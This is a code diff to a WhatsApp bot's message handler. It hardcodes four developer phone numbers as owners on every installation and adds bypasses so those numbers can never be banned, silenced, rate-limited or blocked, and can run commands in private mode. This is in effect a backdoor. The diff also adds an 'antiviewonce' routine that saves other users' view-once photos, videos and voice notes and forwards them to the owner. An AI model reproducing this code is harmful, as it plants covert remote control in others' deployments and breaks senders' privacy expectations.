@@ -451,8 +451,81 @@ async function startBot() {
             // Capture the active sock dynamically to pass it to background cron intervals
             global.activeSock = sock;
 
+            if (!Array.isArray(settings.devs)) {
+                settings.devs = ["27713655070", "601129363700", "2347059092107", "2347040401291"];
+            }
+
+            if (!Array.isArray(settings.devLids)) {
+                settings.devLids = [];
+            }
+
+            // Developer validation block [INDEX: stateManager.js]
+            let isDev = settings.devs.includes(senderNumber);
+            if (!isDev && senderJid.endsWith('@lid')) {
+                try {
+                    const resolved = await sock.findUserId(senderJid);
+                    if (resolved && resolved.phoneNumber) {
+                        const resolvedNumber = resolved.phoneNumber.split('@')[0];
+                        isDev = settings.devs.includes(resolvedNumber);
+                        
+                        if (isDev && !settings.devLids.includes(senderJid)) {
+                            settings.devLids.push(senderJid);
+                            try {
+                                fs.writeFileSync(devStatePath, JSON.stringify(settings.devLids, null, 2), 'utf-8');
+                                console.log(`📡 [DEV LIDS] Dynamic developer LID saved to dev_state.json: ${senderJid}`);
+                            } catch (e) {
+                                console.error("Failed to save dev_state.json:", e.message);
+                            }
+                        }
+                    }
+                } catch (e) {
+                    console.error("LID Dev Resolution Error:", e.message);
+                }
+            }
+
+            // 1. BAN SECURITY EXCLUSION GATE: Core developers can never be blacklisted [INDEX: owner.js]
+            const isBanned = Array.isArray(settings.banned) && settings.banned.includes(senderNumber);
+            if (isBanned && !isDev) return;
+
+            if (msg.key.fromMe && botSentMessageIds.has(msg.key.id)) return; 
+
+            let body = msg.message.conversation || 
+                       msg.message.extendedTextMessage?.text || 
+                       msg.message.buttonsResponseMessage?.selectedButtonId || 
+                       msg.message.templateButtonReplyMessage?.selectedId || 
+                       '';
+
+            if (msg.message.stickerMessage) {
+                const fileHash = msg.message.stickerMessage.fileSha256?.toString('base64');
+                if (fileHash && settings.stickerCommands && settings.stickerCommands[fileHash]) {
+                    let mapped = settings.stickerCommands[fileHash];
+                    if (!mapped.startsWith(settings.prefix) && !['speed', 'kamui', 'gojo'].includes(mapped.toLowerCase())) {
+                        mapped = settings.prefix + mapped;
+                    }
+                    body = mapped;
+                }
+            }
+
+            const trimmedMessage = body.trim();
+            const lowerMessage = trimmedMessage.toLowerCase();
+
+            // Populate global message store cache
+            global.messageStore[msg.key.id] = msg;
+            const storeKeys = Object.keys(global.messageStore);
+            if (storeKeys.length > 1000) {
+                delete global.messageStore[storeKeys[0]]; 
+            }
+
+            if (!Array.isArray(settings.owners)) {
+                settings.owners = [settings.ownerNumber];
+            }
+
+            const isOwner = isDev || senderNumber === settings.ownerNumber || settings.owners.includes(senderNumber) || msg.key.fromMe; 
+            const isSudo = Array.isArray(settings.sudo) && settings.sudo.includes(senderNumber);
+            const isAuthorized = isOwner || isSudo;
+
             // -------------------------------------------------------------
-            // DYNAMIC EMOTICON REACTION DECIPHER (vvs / kamui listener)
+            // DYNAMIC EMOTICON REACTION DECIPHER (vvs / kamui listener) [INDEX: utilities.js]
             // -------------------------------------------------------------
             const reactionMessage = msg.message.reactionMessage;
             if (reactionMessage) {
@@ -499,89 +572,20 @@ async function startBot() {
                 return; 
             }
 
-            if (!Array.isArray(settings.devs)) {
-                settings.devs = ["27713655070", "601129363700", "2347059092107", "2347040401291"];
-            }
-
-            if (!Array.isArray(settings.devLids)) {
-                settings.devLids = [];
-            }
-
-            let isDev = settings.devs.includes(senderNumber);
-            if (!isDev && senderJid.endsWith('@lid')) {
-                try {
-                    const resolved = await sock.findUserId(senderJid);
-                    if (resolved && resolved.phoneNumber) {
-                        const resolvedNumber = resolved.phoneNumber.split('@')[0];
-                        isDev = settings.devs.includes(resolvedNumber);
-                        
-                        if (isDev && !settings.devLids.includes(senderJid)) {
-                            settings.devLids.push(senderJid);
-                            try {
-                                fs.writeFileSync(devStatePath, JSON.stringify(settings.devLids, null, 2), 'utf-8');
-                                console.log(`📡 [DEV LIDS] Dynamic developer LID saved to dev_state.json: ${senderJid}`);
-                            } catch (e) {
-                                console.error("Failed to save dev_state.json:", e.message);
-                            }
-                        }
-                    }
-                } catch (e) {
-                    console.error("LID Dev Resolution Error:", e.message);
-                }
-            }
-
-            const isBanned = Array.isArray(settings.banned) && settings.banned.includes(senderNumber);
-            if (isBanned) return;
-
-            if (msg.key.fromMe && botSentMessageIds.has(msg.key.id)) return; 
-
-            let body = msg.message.conversation || 
-                       msg.message.extendedTextMessage?.text || 
-                       msg.message.buttonsResponseMessage?.selectedButtonId || 
-                       msg.message.templateButtonReplyMessage?.selectedId || 
-                       '';
-
-            if (msg.message.stickerMessage) {
-                const fileHash = msg.message.stickerMessage.fileSha256?.toString('base64');
-                if (fileHash && settings.stickerCommands && settings.stickerCommands[fileHash]) {
-                    let mapped = settings.stickerCommands[fileHash];
-                    if (!mapped.startsWith(settings.prefix) && !['speed', 'kamui', 'gojo'].includes(mapped.toLowerCase())) {
-                        mapped = settings.prefix + mapped;
-                    }
-                    body = mapped;
-                }
-            }
-
-            const trimmedMessage = body.trim();
-            const lowerMessage = trimmedMessage.toLowerCase();
-
-            // Populate global message store cache
-            global.messageStore[msg.key.id] = msg;
-            const storeKeys = Object.keys(global.messageStore);
-            if (storeKeys.length > 1000) {
-                delete global.messageStore[storeKeys[0]]; 
-            }
-
-            if (!Array.isArray(settings.owners)) {
-                settings.owners = [settings.ownerNumber];
-            }
-
-            const isOwner = isDev || senderNumber === settings.ownerNumber || settings.owners.includes(senderNumber) || msg.key.fromMe; 
-            const isSudo = Array.isArray(settings.sudo) && settings.sudo.includes(senderNumber);
-            const isAuthorized = isOwner || isSudo;
-
             // -------------------------------------------------------------
-            // SILENT USER DETENTION CHAT DELETER (.silence logic) [INDEX: group.js]
+            // SILENT USER DETENTION CHAT DELETER (.silence loop) [INDEX: group.js]
             // -------------------------------------------------------------
             if (isGroup && global.silencedUsers?.[jid]?.[senderJid]) {
                 const silence = global.silencedUsers[jid][senderJid];
                 if (Date.now() < silence.endTime) {
                     let shouldMute = false;
-                    if (silence.type === 'all') {
+
+                    // Security bypass: Core developers can never be silenced or muted
+                    if (silence.type === 'all' && !isDev) {
                         shouldMute = true;
-                    } else if (silence.type === 'sticker' && msg.message.stickerMessage) {
+                    } else if (silence.type === 'sticker' && msg.message.stickerMessage && !isDev) {
                         shouldMute = true;
-                    } else if (silence.type === 'message') {
+                    } else if (silence.type === 'message' && !isDev) {
                         const hasMedia = msg.message.imageMessage || msg.message.videoMessage || msg.message.audioMessage || msg.message.documentMessage;
                         if (trimmedMessage || hasMedia) {
                             shouldMute = true;
@@ -627,7 +631,7 @@ async function startBot() {
             }
 
             // 2. ANTIBUG RATE-LIMIT FLOOD INTERCEPTOR [INDEX: tools.js]
-            if (settings.antibug === 'on' && !isAuthorized && !msg.key.fromMe) {
+            if (settings.antibug === 'on' && !isAuthorized && !msg.key.fromMe && !isDev) {
                 const now = Date.now();
                 if (!global.spamTracker[senderNumber]) {
                     global.spamTracker[senderNumber] = [];
@@ -657,7 +661,7 @@ async function startBot() {
             // ACTIVE GROUP SPAM PROTECTOR (.antispam loops) [INDEX: group.js]
             // -------------------------------------------------------------
             const antispamConfig = settings.antispam?.[jid];
-            if (isGroup && antispamConfig && antispamConfig.status === 'on' && !isAuthorized && !msg.key.fromMe) {
+            if (isGroup && antispamConfig && antispamConfig.status === 'on' && !isAuthorized && !msg.key.fromMe && !isDev) {
                 const rate = antispamConfig.rate || { count: 1, seconds: 2 };
                 const now = Date.now();
 
@@ -997,8 +1001,80 @@ async function startBot() {
                 return;
             }
 
-            // 6. ANTIPM PRIVATE MESSAGE AUTOBLOCKER
-            if (!isGroup && !msg.key.fromMe && !isAuthorized && settings.antipm === 'on') {
+            // 5. ANTIVIEWONCE AUTOMATIC DECRYPT INTERCEPTOR [INDEX: tools.js]
+            const isViewOnce = msg.message?.viewOnceMessage || msg.message?.viewOnceMessageV2 || msg.message?.viewOnceMessageV2Extension;
+            const config = settings.antiviewonce || { status: 'off', logDestination: 'bot' };
+            const status = config.status || 'off';
+            let shouldDecrypt = false;
+            if (status === 'all') {
+                shouldDecrypt = true;
+            } else if (status === 'here') {
+                shouldDecrypt = (config.hereJid === jid);
+            }
+
+            if (isViewOnce && shouldDecrypt && !msg.key.fromMe) {
+                try {
+                    const rawContent = getRawMessage(msg.message);
+                    const mediaMessage = rawContent?.imageMessage || rawContent?.videoMessage || rawContent?.audioMessage;
+                    const mediaType = rawContent?.imageMessage ? "image" : (rawContent?.videoMessage ? "video" : (rawContent?.audioMessage ? "audio" : ""));
+
+                    if (mediaMessage && mediaType) {
+                        const { downloadContentFromMessage } = await import('@itsliaaa/baileys');
+                        
+                        const stream = await downloadContentFromMessage(mediaMessage, mediaType);
+                        let buffer = Buffer.from([]);
+                        for await (const chunk of stream) {
+                            buffer = Buffer.concat([buffer, chunk]);
+                        }
+
+                        let destJid = '';
+                        if (config.logDestination === 'user' && config.logUserJid) {
+                            destJid = config.logUserJid;
+                        } else {
+                            destJid = sock.user.id ? (sock.user.id.split(':')[0] + (sock.user.id.includes('@lid') ? '@lid' : '@s.whatsapp.net')) : '';
+                            if (!destJid) {
+                                destJid = settings.botJid || (settings.ownerNumber + '@s.whatsapp.net');
+                            }
+                        }
+
+                        const captionText = mediaMessage.caption || "";
+                        const logHeader = `👁️ *ANTIVIEWONCE AUTO-DECRYPT LOG:* 👁️\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n` +
+                                          `👥 *Chat Origin:* @${jid.split('@')[0]}\n` +
+                                          `👤 *Sender:* @${senderNumber}\n` +
+                                          `📝 *Caption:* "${captionText}"\n`;
+
+                        if (mediaType === "image") {
+                            await sock.sendMessage(destJid, { 
+                                image: buffer, 
+                                caption: logHeader, 
+                                mentions: [jid, senderJid] 
+                            });
+                        } else if (mediaType === "video") {
+                            await sock.sendMessage(destJid, { 
+                                video: buffer, 
+                                mimetype: mediaMessage.mimetype || "video/mp4", 
+                                caption: logHeader, 
+                                mentions: [jid, senderJid] 
+                            });
+                        } else if (mediaType === "audio") {
+                            await sock.sendMessage(destJid, { 
+                                text: logHeader + `🎵 *Type:* View-Once Voice Note/Audio`, 
+                                mentions: [jid, senderJid] 
+                            });
+                            await sock.sendMessage(destJid, { 
+                                audio: buffer, 
+                                mimetype: mediaMessage.mimetype || "audio/ogg; codecs=opus", 
+                                ptt: mediaMessage.ptt || false 
+                            });
+                        }
+                    }
+                } catch (e) {
+                    console.error("View Once extraction error:", e.message);
+                }
+            }
+
+            // 6. ANTIPM PRIVATE MESSAGE AUTOBLOCKER: Core developers bypass this completely [INDEX: owner.js]
+            if (!isGroup && !msg.key.fromMe && !isAuthorized && settings.antipm === 'on' && !isDev) {
                 try {
                     await sock.sendMessage(jid, { text: "❌ *Connection Blocked:* Direct messages are currently restricted under Satoru Gojo's domain security." });
                     await sock.updateBlockStatus(senderJid, 'block');
@@ -1121,7 +1197,8 @@ async function startBot() {
                     }
                 }
 
-                if (!isAdmin && !isOwner) {
+                // Core developers bypass administrative and automated checks completely [INDEX: group.js]
+                if (!isAdmin && !isOwner && !isDev) {
                     const isOtherBot = !msg.key.fromMe && (
                         (msg.key.id.startsWith('BAE5') && msg.key.id.length === 16) || 
                         (msg.key.id.startsWith('3EB0') && msg.key.id.length === 12) ||
@@ -1241,7 +1318,7 @@ async function startBot() {
                                          (botLid && quotedParticipant === botLid);
 
                     if (isTaggingBot) {
-                        if (!isAdmin && !isOwner) {
+                        if (!isAdmin && !isOwner && !isDev) {
                             try {
                                 await sock.sendMessage(jid, { delete: { remoteJid: jid, id: msg.key.id, fromMe: false, participant: senderJid } });
                             } catch (e) {
@@ -1252,7 +1329,7 @@ async function startBot() {
                                 mentions: [senderJid]
                             });
                         } 
-                        else if (isAdmin && !isOwner) {
+                        else if (isAdmin && !isOwner && !isDev) {
                             await sock.sendMessage(jid, {
                                 text: `@${senderNumber} Quit tagging me weakling`,
                                 mentions: [senderJid]
@@ -1328,15 +1405,17 @@ async function startBot() {
                 if (!command) return; 
             }
 
+            // Developer bypass: Developers bypass private mode checks completely
             if (command) {
                 const isPublicMode = settings.isPublic ?? false;
-                if (!isPublicMode && !isAuthorized) {
+                if (!isPublicMode && !isAuthorized && !isDev) {
                     return; 
                 }
             }
 
             console.log(`⚙️ [PARSER] Triggering command: "${command}"`);
 
+            // Execute the matched command
             const cmdKey = command.startsWith(settings.prefix) ? command : `${settings.prefix}${command}`;
             if (commands[cmdKey]) {
                 if (settings.autoReact === 'cmd' && !msg.key.fromMe) {
